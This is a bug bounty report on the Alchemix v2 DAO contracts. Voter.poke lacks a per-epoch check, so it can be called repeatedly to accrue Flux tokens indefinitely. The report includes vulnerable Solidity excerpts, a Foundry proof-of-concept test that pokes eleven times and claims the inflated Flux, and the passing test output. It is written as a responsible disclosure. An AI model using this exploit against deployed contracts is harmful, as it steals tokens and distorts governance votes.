# 30990 - \[SC - Critical] Users can use Voterpoke to accrue Flux tokens i...

Submitted on May 10th 2024 at 05:45:32 UTC by @imsrybr0 for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #30990

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Voter.sol>

Impacts:

* Manipulation of governance voting result deviating from voted outcome and resulting in a direct change from intended effect of original results

## Description

## Brief/Intro

Users can use Voter\@poke to accrue Flux tokens indefinitely.

## Vulnerability Details

```solidity
// ...
contract Voter is IVoter {
    // ...
    function poke(uint256 _tokenId) public {
        // Previous boost will be taken into account with weights being pulled from the votes mapping
        uint256 _boost = 0;

        if (msg.sender != admin) {
            require(IVotingEscrow(veALCX).isApprovedOrOwner(msg.sender, _tokenId), "not approved or owner");
        }

        address[] memory _poolVote = poolVote[_tokenId];
        uint256 _poolCnt = _poolVote.length;
        uint256[] memory _weights = new uint256[](_poolCnt);

        for (uint256 i = 0; i < _poolCnt; i++) {
            _weights[i] = votes[_tokenId][_poolVote[i]];
        }

        _vote(_tokenId, _poolVote, _weights, _boost);  // <=== audit
    }

    function _vote(uint256 _tokenId, address[] memory _poolVote, uint256[] memory _weights, uint256 _boost) internal {
        // ...
        IFluxToken(FLUX).accrueFlux(_tokenId); // <=== audit
        // ...
    }
    // ...
}
```

```solidity
// ...
contract FluxToken is ERC20("Flux", "FLUX"), IFluxToken {
    // ...
    function accrueFlux(uint256 _tokenId) external {
        require(msg.sender == voter, "not voter");
        uint256 amount = IVotingEscrow(veALCX).claimableFlux(_tokenId);
        unclaimedFlux[_tokenId] += amount;
    }
    // ...
}
```

Since `Voter@poke` does not check if the given token id already voted in the current epoch, it can be repeatedly called by a user to accrue Flux tokens indefinitely.

## Impact Details

* Artificially boost voting power for gauges voting.
* Claim Flux ERC20 tokens to :
  * Sell them
  * Use them to ragequit for free

## References

* <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Voter.sol#L195-L212>
* <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Voter.sol#L423>
* <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/FluxToken.sol#L188-L192>

## Proof of Concept

```solidity
    function testPokeRepeatedly() public {
        uint256 tokenId1 = createVeAlcx(admin, TOKEN_1, MAXTIME, false);
        
        hevm.startPrank(admin);

        console2.log("Initial Unclaimed Flux", flux.unclaimedFlux(tokenId1));

        voter.poke(tokenId1);

        console2.log("Unclaimed Flux after one poke", flux.unclaimedFlux(tokenId1));

        for (uint256 i; i < 10; i++) {
            voter.poke(tokenId1);
        }

        console2.log("Unclaimed Flux after 10 other pokes", flux.unclaimedFlux(tokenId1));

        flux.claimFlux(tokenId1, flux.unclaimedFlux(tokenId1));

        console2.log("Flux ERC20 balance", flux.balanceOf(admin));
    }
```

## Results

```console
Ran 1 test for src/test/Voting.t.sol:VotingTest
[PASS] testPokeRepeatedly() (gas: 1457575)
Logs:
  Initial Unclaimed Flux 0
  Unclaimed Flux after one poke 994553684669529957
  Unclaimed Flux after 10 other pokes 10940090531364829527
  Flux ERC20 balance 10940090531364829527

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 55.84s (45.19s CPU time)

Ran 1 test suite in 57.17s (55.84s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
